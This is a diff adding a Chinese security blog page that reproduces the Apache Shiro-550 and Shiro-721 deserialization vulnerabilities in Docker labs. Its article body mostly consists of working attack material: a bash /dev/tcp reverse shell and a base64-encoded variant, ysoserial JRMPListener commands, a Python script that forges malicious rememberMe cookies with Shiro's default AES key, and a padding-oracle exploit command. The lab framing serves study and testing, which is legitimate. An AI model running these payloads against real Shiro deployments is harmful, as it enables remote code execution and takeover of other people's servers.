@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		
+<title>Shiro反序列化漏洞复现-信息安全博客</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">
+
+
+<meta name="keywords" content="漏洞复现,Shiro,">
+<meta name="description" content="">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+	<meta name="generator" content="Hexo 5.4.0"></head>
+
+	<body>
+		
+<link rel="stylesheet" href="/css/page.css">
+
+
+<link rel="stylesheet" href="/css/page_cente.css">
+
+
+<link rel="stylesheet" href="/css/atom-one-dark.css">
+
+
+<link rel="stylesheet" href="/css/header.css">
+
+	<div class="header">
+		<div class="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										主页
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										文章
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										分类
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										标签
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										友情链接
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										关于
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>TRRQ</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">主页</a>
+        </li>
+        
+        <li>
+            <a href="/archives">文章</a>
+        </li>
+        
+        <li>
+            <a href="/categories">分类</a>
+        </li>
+        
+        <li>
+            <a href="/tags">标签</a>
+        </li>
+        
+        <li>
+            <a href="/links">友情链接</a>
+        </li>
+        
+        <li>
+            <a href="/about">关于</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'
+    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
+</div>
+<style>
+    .sidebar {
+        width: 0;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        background: #fff;
+        z-index: 999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
+</script>
+		<script>
+			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
+		</script>
+<div class="header-bg bg-content-img">
+    <div class="bg-content">
+        <ul class="tag">
+            
+            
+            <li><a href="/tags/漏洞复现">漏洞复现</a></li>
+            
+            <li><a href="/tags/Shiro">Shiro</a></li>
+            
+            
+        </ul>
+        <h1>Shiro反序列化漏洞复现</h1>
+        <div class="article-info">
+            <div class="article-author">
+                
+                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                    <path
+                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                        p-id="2902" fill="#ffffff"></path>
+                </svg>
+                
+                <span> <a href="">TRRQ</a></span>
+                <p>2021-08-14 12:59:10</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="article-content">
+    <div id="article" class="content">
+        <h1 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h1><p>Apache Shiro是一个强大且易用的Java安全框架,<strong>执行身份验证、授权、密码和会话管理</strong>。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
+</br>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>Shiro-550漏洞原理：</strong></p>
+<p>影响版本：Apache Shiro &lt; 1.2.4</p>
+<p>Shiro框架提供了记住密码的功能，用户登录成功会生成加密编码的cookie，在服务端对rememberMe的cookie，先进行了base64解码，然后AES解码后再反序列化</p>
+<p>所以说，如果我们要构造payload，首先需要对我们执行的指令进行序列化，让服务端进行反序列化执行我们的指令</p>
+<p>序列化构造poc过程：</p>
+<p>指令-&gt;序列化-&gt;AES加密-&gt;base64编码-&gt;rememberMe cookie</p>
+<p>首先利用条件就是我们需要知道AES的iv密钥，所以我们可以使用默认的或者是暴力破解来尝试</p>
+</br>
+
+<p><strong>Shiro-721漏洞原理：</strong></p>
+<p>影响版本：Apache Shiro &lt; 1.4.2版本</p>
+<p>Apache Shiro cookie中通过AES-123-CBC模式加密rememberMe cookie字段存在问题，用户可以通过Padding Oracle加密生成的攻击代码构造恶意的rememberMe字段，并且重新请求网站，导致反序列化执行我们的指令，造成了远程代码执行。</p>
+</br>
+
+<p><strong>共同之处：</strong></p>
+<p>都是由于加密算法存在漏洞，并且使用默认或简单密钥</p>
+</br>
+
+<p><strong>靶场搭建</strong></p>
+<p>docker搭建</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install docker<br>apt-<span class="hljs-builtin-name">get</span> install docker-compose<br>reboot<span class="hljs-built_in"></span><br><span class="hljs-built_in">service </span>docker start<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>Shiro-550靶场</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">获取docker镜像<br>docker pull medicean/vulapps:s_shiro_1<br>启动docker镜像：<br>docker <span class="hljs-builtin-name">run</span> -d -p 8080:8080 medicean/vulapps:s_shiro_1<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>Shiro-721靶场</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">下载Shiro-<span class="hljs-number">721</span>复现靶场<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndz/</span>Shiro-<span class="hljs-number">721</span>.git<br>进入shiro/docker<br>cd Shiro-<span class="hljs-number">721</span>/Docker<br>启动docker镜像<br>docker build -t shiro-<span class="hljs-number">721</span> .    <span class="hljs-regexp">//</span>不要忽略<span class="hljs-number">721</span>后面的那个点，意为当前路径<br>docker run -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p><strong>攻击机使用工具及环境配置：</strong></p>
+<p>Burpsuite</p>
+<p>java：</p>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">sudo apt-<span class="hljs-keyword">get</span> install <span class="hljs-keyword">default</span>-jdk<br></code></pre></td></tr></table></figure>
+
+<p>maven：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install maven<br></code></pre></td></tr></table></figure>
+
+<p>ysoserial并打包</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/frohoff/y</span>soserial.git<br>cd ysoserial<br>mvn package -D skipTests<br></code></pre></td></tr></table></figure>
+
+<p>生成的工具在ysoserial/target文件</p>
+</br>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="Shiro-550漏洞复现"><a href="#Shiro-550漏洞复现" class="headerlink" title="Shiro-550漏洞复现"></a>Shiro-550漏洞复现</h4><p>我们首先访问下登录界面，可以看到账户密码都给我们了</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142115.png"></p>
+</br>
+
+<p>通过burpsuite进行抓包，我们来看下shiro rememberme后的数据包</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142310.png"></p>
+</br>
+
+<p>这是认证成功后的跳转，我们可以看到rememberme设置的一串类似aes的密文</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142411.png"></p>
+</br>
+
+<p>通过爆破shiro密钥的软件进行密钥探测（研究漏洞利用原理，所以就不用软件自带的）</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814151309.png"></p>
+</br>
+
+<p>爆破的原理也就是序列化过程，拿密钥aes加密再base64一系列的加密过程去测试</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814170739.png"></p>
+</br>
+
+<p>攻击机监听本地端口</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+
+<p>vps上执行</p>
+<p>构造payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机ip/</span>监听端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/192.168.1.116/</span><span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>由于传入字符串可能会无法执行我们使用</p>
+</br>
+
+<p><strong>Runtime.getRuntime().exec()会执行上面payload会失败</strong></p>
+<p>例如，<code>ls &gt; dir_listing</code>  在shell中执行为将当前目录的列表输出到命名为 <code>dir_listing</code> 。但是在 <code>exec()</code>  函数的中，该命令为解释为获取 <code>&gt;</code> 和 <code>dir_listing</code> 目录的列表</p>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p>生成出通过bash-c执行命令，并且通过base64来解决</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -c &#123;echo,YmFzaCAtaSA+JiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">8</span>xOTIuMTY<span class="hljs-number">4</span>LjEuMTE<span class="hljs-number">2</span>LzEyMzQgMD<span class="hljs-number">4</span>mMQ==&#125;|&#123;base<span class="hljs-number">64</span>,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后使用ysoserial的JRMP监听模块，监听6666端口并执行反弹shell命令</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">java -cp ysoserial-<span class="hljs-number">0.0</span>.<span class="hljs-number">6</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> ysoserial<span class="hljs-selector-class">.exploit</span><span class="hljs-selector-class">.JRMPListener</span> 【port】 CommonsCollections4 <span class="hljs-string">&#x27;【commands】&#x27;</span><br>构造后<br>java -cp ysoserial-<span class="hljs-number">0.0</span>.<span class="hljs-number">6</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> ysoserial<span class="hljs-selector-class">.exploit</span><span class="hljs-selector-class">.JRMPListener</span> <span class="hljs-number">6666</span> CommonsCollections4 <span class="hljs-string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTE2LzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>使用我们的shiro进行编码来构造payload</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">import sys<br>import uuid<br>import base64<br>import subprocess<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import AES<br>def encode_rememberme(command):<br>    popen = subprocess.<span class="hljs-built_in">Popen</span>([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = lambda s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).<span class="hljs-built_in">encode</span>()<br>    key = base64.<span class="hljs-built_in">b64decode</span>(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.<span class="hljs-built_in">uuid4</span>().bytes<br>    encryptor = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_CBC, iv)<br>    file_body = <span class="hljs-built_in">pad</span>(popen.stdout.<span class="hljs-built_in">read</span>())<br>    base64_ciphertext = base64.<span class="hljs-built_in">b64encode</span>(iv + encryptor.<span class="hljs-built_in">encrypt</span>(file_body))<br>    return base64_ciphertext<br><br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = <span class="hljs-built_in">encode_rememberme</span>(sys.argv[<span class="hljs-number">1</span>])   <br>print <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.<span class="hljs-built_in">decode</span>())<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>python生成我们的最终payload</p>
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python2</span>安装<span class="hljs-string">pip</span><br><span class="hljs-string">curl</span> <span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-built_in">get-pip.py</span> -<span class="hljs-string">o</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">python2</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-built_in">--upgrade</span> <span class="hljs-string">setuptools</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">build-essential</span> <span class="hljs-string">python-dev</span> <span class="hljs-string">libssl-dev</span> <span class="hljs-string">libffi-dev</span> <span class="hljs-string">libxml2</span> <span class="hljs-string">libxml2-dev</span> <span class="hljs-string">libxslt1-dev</span> <span class="hljs-string">zlib1g-dev</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">pip2</span> <span class="hljs-string">install</span> <span class="hljs-string">pycrypto</span><br><br>生成<span class="hljs-string">payload</span>，记得是要在<span class="hljs-string">ysoserial</span>目录下<br><span class="hljs-string">python2</span> <span class="hljs-string">shiro</span>.<span class="hljs-string">py</span> <span class="hljs-string">ip:JRMP监</span>听端口<br><span class="hljs-string">python2</span> <span class="hljs-string">shiro</span>.<span class="hljs-string">py</span> <span class="hljs-string">192</span>.<span class="hljs-string">168</span>.<span class="hljs-string">1</span>.<span class="hljs-string">116:6666</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>将获取到payload填入登录的cookie中</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814180502.png"></p>
+</br>
+
+<p>成功获取到shell</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814180606.png"></p>
+</br>
+
+<h4 id="Shiro-721漏洞复现"><a href="#Shiro-721漏洞复现" class="headerlink" title="Shiro-721漏洞复现"></a>Shiro-721漏洞复现</h4><p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814191030.png"></p>
+</br>
+
+<p>使用dnslog进行</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar CommonsBeanutils<span class="hljs-number">1</span> <span class="hljs-string">&quot;ping k95ut8.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>使用rememberme作为前缀来加载payload，进行Padding Oracle攻击</p>
+<p>使用靶场自带的exp</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814195612.png"></p>
+</br>
+
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> setup.py build<br><span class="hljs-attribute">python2</span> setup.py install<br><span class="hljs-attribute">python2</span> shiro_payload.py http://<span class="hljs-number">192.168.1.115:8080</span>/account/ lq<span class="hljs-number">91</span>JAxRWju<span class="hljs-number">1</span>xv<span class="hljs-number">4</span>/XcHeWqh/TukrkTuxn<span class="hljs-number">2</span>LD<span class="hljs-number">1</span>CrBZ/JSs<span class="hljs-number">9</span>oOZSZo<span class="hljs-number">8</span>cYlevwOZt<span class="hljs-number">54</span>yTw<span class="hljs-number">4</span>vHMh<span class="hljs-number">6</span>yyB<span class="hljs-number">9</span>xS<span class="hljs-number">7</span>BoJ<span class="hljs-number">49</span>IPwET<span class="hljs-number">60</span>IuQFgBZwCUwAu/uTjlAoRG<span class="hljs-number">4</span>rNh<span class="hljs-number">9</span>YiYL/<span class="hljs-number">8</span>bIIyDgOACT<span class="hljs-number">3</span>+t/Yk+L<span class="hljs-number">6</span>Hn/up<span class="hljs-number">3</span>u<span class="hljs-number">9</span>xMZ<span class="hljs-number">9</span>pWRjVK<span class="hljs-number">7</span>DQ<span class="hljs-number">3</span>ZccfqgOms<span class="hljs-number">08</span>TDrFrdwFnDOnUt<span class="hljs-number">2</span>erQ<span class="hljs-number">4</span>vb<span class="hljs-number">6</span>CCHGf<span class="hljs-number">0</span>QslhbrnDF<span class="hljs-number">0</span>VcblDigreQ<span class="hljs-number">9</span>vyzGfPkCW<span class="hljs-number">3</span>gDeDf+iwddvrFwlvd<span class="hljs-number">7</span>d+<span class="hljs-number">9</span>BKmhM+QuM<span class="hljs-number">8</span>nq<span class="hljs-number">0</span>RCg<span class="hljs-number">96</span>XJNCD<span class="hljs-number">6</span>PmmRMom<span class="hljs-number">0</span>o<span class="hljs-number">8</span>bUHTCg<span class="hljs-number">0</span>OSKJnGBRPeuult<span class="hljs-number">6</span>aoZtttGdZ<span class="hljs-number">0</span>MDyYZooZp<span class="hljs-number">4</span>LP<span class="hljs-number">7</span>ojtS<span class="hljs-number">1</span>ZVLYavpAv<span class="hljs-number">6</span>RQ<span class="hljs-number">93</span>BeO<span class="hljs-number">5</span>ZOx<span class="hljs-number">0</span>nIkTqJ<span class="hljs-number">7</span>CTxG<span class="hljs-number">8</span>CB<span class="hljs-number">8</span>XzvvxvK<span class="hljs-number">6</span>oGOURA<span class="hljs-number">2</span>UE<span class="hljs-number">3</span>IIzoukbglzKAVWOdMD<span class="hljs-number">0</span>BmjBOH<span class="hljs-number">1</span>xQfAHXXFpHH<span class="hljs-number">2</span>VkgiSPPMeZMe<span class="hljs-number">1</span>+yVhSgumjhRN<span class="hljs-number">5</span>c<span class="hljs-number">97</span>bY<span class="hljs-number">9</span>d+<span class="hljs-number">49</span>hkoleEBAOtS<span class="hljs-number">1</span>pIKIxdAuwHRP<span class="hljs-number">0</span>WgNZPqFFLmtG/s/Os payload.class<br></code></pre></td></tr></table></figure>
+
+<p>爆破需要3个小时，所以就不演示，最后就将获取到的cookie替换即可，最后查看dnslog平台</p>
+
+    </div>
+</div>
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 109;
+        width: 600px !important;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            width: 88%
+        }
+    }
+</style>
+<script>
+    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
+</script>
+<div class="Last-Next">
+    
+    <a href="/2021/09/02/Logger-%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%8A%80%E5%B7%A7/">
+        <div class="last">
+            <span>上一篇</span>
+            <p>Logger++插件使用与技巧</p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2021/08/06/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="next">
+            <span>下一篇</span>
+            <p>Fastjson反序列化漏洞复现</p>
+        </div>
+    </a>
+    
+</div>
+		
+<link rel="stylesheet" href="/css/food.css">
+
+<div class="footer">
+	<div class="Copyright">
+		©2022 By TRRQ. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: block;
+            border-radius: 50%;
+            width: 66px;
+            height: 66px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            transition: border .5s;
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 30px;
+            height: 30px;
+            margin-top: 17.5px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
+</script>
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+
+</html>
